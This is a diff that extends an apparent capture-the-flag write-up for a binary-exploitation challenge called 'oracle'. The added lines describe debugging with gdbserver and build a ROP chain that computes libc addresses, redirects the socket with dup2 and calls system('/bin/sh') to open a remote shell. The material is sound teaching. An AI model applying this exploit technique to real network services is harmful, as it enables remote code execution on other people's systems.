@@ -6,7 +6,7 @@
 
 ## Enumeration
 
-Download the given archive, extract, and let's dig inside. 
+Download the given archive, extract, and let's dig inside. Oh sweet, we're given the source code in `C`.
 
 ```
 -rwxrw-rw-  1 kali kali   92 Feb  2 09:53 build_docker.sh
@@ -199,12 +199,39 @@ docker build --tag=oracle .
 docker run -it -p 9001:9001 -p 9090:9090 --cap-add=SYS_PTRACE --rm --name=oracle oracle
 ```
 
-Once this is done, you just connect to the docker container and install gdb-server and run `gdbserver :9090 --attach $(pidof oracle)`, you can also do these in Dockerfile. 
+Once this is done, you just connect to the docker container and install gdb-server and run `gdbserver :9090 --attach $(pidof oracle)`, you can also do these in Dockerfile.
+
+Have fun debugging.
 
 ![image](https://github.com/respawnRW/writeups/assets/163560495/1e2d9054-53b9-4b02-9796-e41136d0e6d6)
 
+And let's not forget about the libc correct version, you extract that from docker container, in order to be sure.
+
+Next steps are the core of ROP chain construction. The memory address of `system` is what we are looking for, then we calculate the address of the gadget ending with `pop rdi; ret` As we discussed earlier this way we can control the value of the `rdi` register and manipulate execution flow. The second value is the register `rsi` which is going to be used as a second argument for our system function. Remember, we're planning to do `system('/bin/sh')`. `Next` function is going to retrieve the first occurence's address. Finally  the `dup2` system call within libc will be used to redirect standard i/o so we can interact with the spawned shell.
+
+```python
+libc = ELF('./libc-2.31.so')
+libc.address = leak - 2018048  # Calculate the libc base address
+system_addr = libc.symbols['system']
+pop_rdi = libc.address + 0x0000000000023b6a
+pop_rsi = libc.address + 0x000000000002601f
+ret = libc.address + 0x0000000000022679
+binsh = next(libc.search(b'/bin/sh'))
+dup2 = libc.symbols['dup2']
+```
 
 In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, enabling interactive access. This is what you will see when building up the payload for the ROP chain. 
+
+And here's how we put together the entire ROP payload. In the end we need to send `\r\n\r\n` as we seen from `parse_headers` function. We're going to fill the buffer up to the point of overflow with `A`'s. Prepare the first dup2 from 0x0 to 0x6, then we call the dup2 so it redirects input from socket. The same process is repeated with `pop_rsi, 0x1` in order to redirect the `stdout` as well with the help of `dup2` call. And as a last step, we are constructing how to call the `system('/bin/sh')`, first we place the address of the string into the `rdi` register it's going to be the argument of the call - i.e. what to call. Followed by a stack alignment gadget the `ret` and the `system_addr` function is being called which will in the end spawn the shell.
+
+```
+payload = flat(
+    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
+    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
+    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
+)
+io.send(payload + b'\r\n\r\n')
+```
 
 Find below the entire code that does the job done. The pwn script was adapted and comprehensively commented in great depth with multiple print statements during execution. 
 
